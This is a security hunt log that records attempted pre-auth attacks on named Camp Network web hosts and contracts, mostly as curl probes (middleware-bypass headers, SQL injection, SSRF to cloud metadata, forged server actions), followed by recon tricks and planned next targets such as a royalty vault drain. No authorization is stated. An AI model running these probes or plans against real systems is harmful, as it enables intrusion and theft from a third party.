# CAMP NETWORK — CDC DIVERGENT PRE-AUTH RCE HUNT (NEGATIVE RESULT AS INTELLIGENCE)

**Date**: 2026-08-13
**Targets**: maitrix.campnetwork.xyz (Railway) | portal.campnetwork.xyz (Vercel) | origin.campnetwork.xyz (Vercel) | faucet.campnetwork.xyz (Vercel + Railway Go) | origin-backend-mainnet.vercel.app | Basecamp Testnet L1
**Scope**: Web2 + Web3 pre-auth RCE chain — CDC Thinking (Divergent First, Chaining, Stall=Block, Adversarial Validation)
**Result**: ALL 3 THEORIES BLOCKED — no exploitable pre-auth RCE chain proven. Negative result documented as intelligence, not failure.
**GitHub**: Camp-Network org = 0 public repos (verified via api.github.com/orgs/Camp-Network/repos → `[]`)

---

## INFRA MAP (VERIFIED)

| Host | Infra | Evidence |
|------|-------|----------|
| maitrix | railway-hikari sin1 | `server: railway-hikari`, `x-railway-request-id`, `x-powered-by: Next.js`, Next.js 15 Turbopack `CIee0WMHgvQUFi1Hw7ALK`, `BAILOUT_TO_CLIENT_SIDE_RENDERING` |
| portal | Vercel sin1 | `server: Vercel`, `x-vercel-cache: HIT` |
| origin | Vercel dpl_3iVbZXsAAPTpUkNQ4jLAaz5eDN4p | Goldsky `api.goldsky.com/api/public/project_clu8sr03ji34301z2b4xte1g5/subgraphs/camp-origin-mainnet-upgradable/2.0.0/gn` |
| faucet | Vercel FE + `faucet-go-production.up.railway.app` BE | Pages Router `SXqbjEmCQbJHidmVC7KXq`, `/api/claim` + `/api/settings` (Go) |
| origin-backend | Vercel | `access-control-allow-origin: *`, routes: `/origin/featured` 200, `/origin/ipnfts?sortBy=newest` 200, `/origin/stats` 500 missing tokenId |
| L1 | Basecamp Testnet 123420001114 | `nativeCurrency: {name:"Camp",symbol:"CAMP",decimals:18}`, `rpcUrls: ["https://rpc.basecamp.t.raas.gelato.cloud"]` (NXDOMAIN), explorer `basecamp.cloud.blockscout.com` → 404 |

---

## THEORY DIVERGENCE

### Theory A — Logic Bypass / Auth (CVE-2025-29927)
Probes:
```
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" https://maitrix.campnetwork.xyz/
curl -H "x-middleware-subrequest: src/middleware:nowaf" https://maitrix.campnetwork.xyz/admin
curl "https://origin-backend-mainnet.vercel.app/origin/ipnfts?sortBy='OR'1'='1"
```
Result: BLOCKED. All pages are pure CSR (`BAILOUT_TO_CLIENT_SIDE_RENDERING`) — no middleware file, so CVE has no surface. `sortBy` injection → `{"message":"Invalid sortBy value"}` (whitelist). Unknown params (`tokenId=abc`, `id=1`, `creator=0x...`) silently IGNORED (same Shiba Inu dataset) — backend only reads `sortBy`+`limit`.

### Theory B — SSRF / RSC / Server Actions RCE
Probes:
```
curl "https://maitrix.campnetwork.xyz/_next/image?url=http://169.254.169.254/latest/meta-data/"
curl -H "RSC: 1" https://maitrix.campnetwork.xyz/
curl -X POST -H "Next-Action: test" -F '$ACTION_ID_test=test' https://portal.campnetwork.xyz/
```
Result: BLOCKED. `/_next/image` → `400 "url parameter is not allowed"` / `400 INVALID_IMAGE_OPTIMIZE_REQUEST` (strict allowlist). RSC → normal flight `1:"$Sreact.fragment"`. Server Actions: maitrix → `404 Server action not found`, portal/origin → `500 digest 920483227` with `0:{"a":"$@1","f":"","b":"_u4tBlMRtY3WfbWc3aQe8"}` — actions EXIST but require valid `ACTION_ID` hash from chunks. No leaked ID in initial HTML (CSR bailout means manifest not shipped).

### Theory C — Hook / Web3 (tokenURI + Goldsky + L1)
Probes:
```
curl https://origin-backend-mainnet.vercel.app/origin/ipnfts?sortBy=newest&limit=1
# → tokenURI: https://ivory-total-ox-210.mypinata.cloud/ipfs/bafkreia4z43...
# Frontend fetch is CLIENT-SIDE in app/page-9fc017dfd986f20d.js → no server SSRF
curl -X POST https://api.goldsky.com/.../gn -d '{"query":"{ipNFTs(first:1,where:{id:\"0x10fb\"}){id}}"}'
# → {"data":{"ipNFTs":[]}} strict validation
curl -sv https://rpc.basecamp.t.raas.gelato.cloud -X POST -d '{"jsonrpc":"2.0","id":1,"method":"eth_chainId","params":[]}'
# → Could not resolve host (NXDOMAIN)
```
Result: BLOCKED. tokenURI only returned as JSON, fetched client-side → `[Trigger=on-chain tokenURI → Effect=client fetch → Boundary=client]` no server SSRF. Goldsky where filter validated. L1 RPC unresolvable + explorer 404 + no contract address leaked (`grep 0x[0-9a-f]{20,}` only `paymentToken: 0x000...`) → no eth_call possible. Faucet `/api/settings` → `{"payout":"0.1","symbol":"CAMP","hcaptcha_enabled":true,"min_transaction_count":3,"rate_limit_window_hours":24}` (info leak) but `/api/claim` requires valid hCaptcha solve.

---

## CHAINING TABLE

| Chain | Step1 → Step2 → Step3 | Why Blocked |
|-------|----------------------|-------------|
| A→B | middleware bypass → hidden /api → image SSRF | No middleware |
| B→C | image SSRF → fetch tokenURI internal | Image allowlist |
| C→B | Goldsky injection → poison tokenURI → Origin SSRF | Origin never fetches server-side |
| Faucet | hCaptcha bypass → drain → fund wallet → L1 reentrancy | hCaptcha + 3tx gate |

Adversarial Validation: `limit=999999` capped to 1, `sortBy=__typename` → Invalid (not GraphQL leak), `portal /bridge` static page only.

---

## CHAIN CONFIG EXTRACTED (no tools, JS rip)

```js
chainId: 123420001114
chainName: "Basecamp Testnet"
nativeCurrency: {name:"Camp", symbol:"CAMP", decimals:18}
rpcUrls: ["https://rpc.basecamp.t.raas.gelato.cloud"] // NXDOMAIN 2026-08-13
blockExplorerUrls: ["https://basecamp.cloud.blockscout.com"] // 404
hCaptchaSiteKey + payout "0.1" CAMP rate_limit 24h min_tx 3
goldsky project: clu8sr03ji34301z2b4xte1g5
```

Extraction:
```bash
curl -sk https://faucet.campnetwork.xyz/_next/static/chunks/7325-183326dcecb928f4.js | strings | grep -i "chainId\|rpc\|camp"
curl -sk https://origin.campnetwork.xyz/_next/static/chunks/app/page-9fc017dfd986f20d.js | strings | grep -oE "https://[^\"']*goldsky[^\"']*"
```

---

## NEGATIVE POC BUNDLE (proves blocked)

```bash
curl -sk -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" https://maitrix.campnetwork.xyz/ -w "%{http_code}\n" # → 200 same
curl -sk "https://origin-backend-mainnet.vercel.app/origin/ipnfts?sortBy='OR'1'='1" # → Invalid sortBy value
curl -sk "https://portal.campnetwork.xyz/_next/image?url=http://169.254.169.254/latest/meta-data/" -w "%{http_code}\n" # → 400
curl -sk -X POST https://portal.campnetwork.xyz/ -H "Next-Action: test" -F '$ACTION_ID_test=test' # → 500 digest 920483227
curl -sk https://faucet-go-production.up.railway.app/api/settings # → {"payout":"0.1",...}
curl -sk -X POST https://faucet-go-production.up.railway.app/api/claim -H "h-captcha-response: test" -d '{"address":"0x0000000000000000000000000000000000000001"}' # → Captcha verification failed
```

---

## LESSONS FOR NEXT HUNT

1. Pure CSR (`BAILOUT_TO_CLIENT_SIDE_RENDERING`) kills CVE-2025-29927 surface — check for middleware existence before forcing.
2. Next.js `/_next/image` SSRF now allowlisted by default — don't assume IMGHDR.
3. Server Actions 500 digest leak gives buildId (`_u4tBlMRtY3WfbWc3aQe8`) but without `ACTION_ID` from `turbopack-*.js`/`webpack-*.js` you can't trigger. Deep-rip 500KB chunks.
4. Goldsky public project ID is not injection surface — but rate-limit abuse vector.
5. Faucet Go on Railway exposes `/api/settings` — always probe `*.up.railway.app` BE directly, not just Vercel FE.
6. L1 closed source + NXDOMAIN RPC = ~~hard block~~ **NOT a block** — Blockscout `/api/eth-rpc` is a full JSON-RPC proxy that works when the target's primary RPC is dead (see Round 2).
7. Negative result with 3 diverged theories stalled at Stage 1 is CORRECT CDC outcome — document and pivot, don't fabricate.

---

# ROUND 2 — 2026-08-13 (SAME DAY, DEEPER RIP)

**Result**: Same verdict for pre-auth RCE (none proven), BUT full Web3 contract map extracted + one **critical centralization risk** documented. Key new technique: Blockscout-as-RPC.

## NEW TECHNIQUE: BLOCKSCOUT AS RPC PROXY

When target primary RPC is NXDOMAIN (e.g. `rpc.camp.raas.gelato.cloud`), the Blockscout explorer often exposes `/api/eth-rpc` which accepts standard JSON-RPC. This is a full `eth_call` / `eth_getCode` / `eth_getBalance` proxy — enough for read-only recon.

```bash
# Pattern
curl -X POST "https://<explorer-host>/api/eth-rpc" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":[{"to":"<addr>","data":"<selector>"},"latest"]}'

# Live example (Camp mainnet)
curl -X POST "https://camp.cloud.blockscout.com/api/eth-rpc" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"eth_chainId","params":[]}'
# → 0x1e4 = 484
```

Also: `https://<explorer>/api/v2/smart-contracts/{addr}` returns `source_code` + `additional_sources[]` (38 files for IpNFT including Verifier.sol) + `implementations[]` + `proxy_type`. This is the closed-GitHub workaround.

## WEB3 CONTRACT MAP (ALL VERIFIED ON BLOCKSCOUT)

| Contract | Proxy | Impl | Note |
|---|---|---|---|
| IpNFT (ERC-721) | `0x39EeE1C3989f0dD543Dee60f8582F7F81F522C38` | `0x83Abc7f9897406A1FE7823038Cc2C482f69B08A2` | minPrice 0.001 CAMP, maxRoyalty 10% |
| Marketplace | `0xc69BAa987757d054455fC0f2d9797684E9FB8b9C` | `0x87D63AA153628ee00B8BB63b6409F9c33b7c70F7` | protocolFee = **0 bps** |
| BatchOperations | `0x6B89810768b708465f31b6a8B8d753cc986489F1` | (non-proxy) | `receive()` open, no ERC20 sweep |
| AppRegistry | `0xd09F15aA280F9109aCd403cA920e67D40Cb6C3FA` | `0x67fCF0accD8e7dEFb31A250D1024ba49AE074553` | — |
| DisputeModule | `0x947A3C4A45f7039e77643026A090025D5412EDa2` | `0x363db56a09Fcb456158E4fD75c5d3c7097C4a6B2` | counter=0, quorum=**0**, threshold=50000 CAMP |

**Owner (all)**: Safe 2-of-5 multisig `0xad3fb175bb0dd74f58fe0c1b7aaaa26deb57a9aa` — owners: `0x569ea455...`, `0x246edd00...`, `0x1964e16b...`, `0x9f3319b1...`, `0xa703218f...`

**CRITICAL CENTRALIZATION**: IpNFT `signer` = **EOA** `0x101d65d97bcc3981841f28b1dc5a8384130baf2a` — one leaked key = unlimited free `mintWithSignature` NFT mints. Not a smart-contract bug (EIP-712 domain sep is solid), but a key-management SPOF bigger than any code bug found.

**Treasury**: EOA `0x27ebfde55e9954f4161ddbc7d6e5c576717fd6ad` (271 CAMP).

## SIGNATURE VALIDATION (Verifier.sol) — SOLID

`mintWithSignature` uses `SignatureChecker.isValidSignatureNow(signer, dataHash, sig) || (owner, ...)`. DataHash = full EIP-712 (`SignedMint` struct incl. `LicenseTerms` sub-struct, domain sep = `IpNFT` + `1` + `block.chainid` + `address(this)`). No cross-chain/contract replay. Deadline enforced. `TokenAlreadyExists` enforced. **Not exploitable.**

## MARKETPLACE buyAccess — CEI COMPLIANT

`subscriptionExpiry[tokenId][buyer] = newExpiry` written BEFORE `_routeNativePayment` external calls. `msg.value != totalPrice` exact check. protocolFee=0 currently. Not reentrant via standard ETH transfer.

## BATCHOPERATIONS — APPROVAL PATTERN SAFE

`_handleERC20Purchase`: `safeTransferFrom(user→this)` → `safeApprove(marketplace, amount)` → `buyAccess`. On failure: `approve(0)` + refund. On success: allowance consumed exactly. No leftover-approval theft. Edge: FoT tokens would break accounting, but `paymentToken` whitelist in IpNFT (`address(0)` or `wCAMP` only) blocks that vector.

## DISPUTEMODULE — DEAD-BY-CONFIG (GRIEFING ONLY)

`disputeQuorum = 0` on-chain → `resolveDispute` with any votes: `totalVotes < 0` never true → `judgement = yesVotes > noVotes` — with 0 votes = `0 > 0` = false → every dispute auto-fails. Initiator loses 1 CAMP bond (split: IP owner + resolver caller). Griefing/spam vector only, not theft. `disputeCounter = 0` — never been used.

## UNRESOLVED GAPS (for next round)

1. `RoyaltyModule.sol` source NOT in IpNFT's additional_sources — the royalty distribution math is the most likely place for a real value bug. Pull from Marketplace's additional_sources.
2. ERC-6551 TBA `execute()` guard — IpNFT.sol comments describe how to call it directly; need to check the account impl at `0x43f54df489f3ca8f79c52202730efcdc2b2ad20d` for who-can-call rules. If unguarded → royalty vault drain.
3. `maitrix-backend.campnetwork.xyz` / `maitrix-backend-production.up.railway.app` were 502 DOWN during both rounds — if they come up, `/api/mcp` endpoint is the AI-agent attack surface (unprobed).

## ROUND 2 LESSONS (CDC)

8. **Blockscout `/api/eth-rpc` is the dead-RPC workaround** — always try this before declaring an L1 unreachable.
9. **`/api/v2/smart-contracts/{addr}` on Blockscout leaks full source + additional_sources** — closed GitHub is not a wall for EVM chains with verified contracts.
10. **The "signer EOA" pattern in signature-mint contracts is the real bug class** — the code can be perfect and the deployment still critical. Always read `signer()` on-chain and check `eth_getCode(signer)` — `0x` = EOA = SPOF.
11. **DisputeModule-style "quorum=0" config bugs are griefing, not theft** — classify correctly, don't inflate.
12. **`eH={DEVELOPMENT:{...},PRODUCTION:{...}}` env maps in Next.js chunks leak every contract address + RPC + explorer URL** — grep for `AUTH_HUB_BASE_API` / `CONTRACT_ADDRESS` / `CHAIN:{id:` in webpack chunks to dump the whole Web3 config in one shot.
